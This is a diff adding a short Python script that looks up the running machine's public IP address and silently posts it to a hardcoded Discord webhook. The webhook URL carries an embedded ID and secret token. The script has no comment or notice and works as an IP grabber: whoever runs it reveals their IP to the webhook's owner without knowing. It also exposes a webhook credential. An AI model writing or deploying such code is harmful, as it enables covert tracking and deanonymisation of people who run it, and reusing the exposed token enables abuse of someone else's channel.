@@ -1,0 +1,19 @@
+import requests
+
+webhook_url = "https://discord.com/api/webhooks/1148650668056391752/ALHVGMp7_AiniARCGFEu6Ytd6bsjFCeTbzX9DQEuKJsDPq0zHf4UIYO4AiK5dq16TgXx"
+
+def get_ip_address():
+    url = 'https://api.ipify.org'
+    response = requests.get(url)
+    ip_address = response.text
+    return ip_address
+
+ip = get_ip_address()
+
+message = ip
+
+data = {
+    "content": message
+}
+
+response = requests.post(webhook_url, json=data)
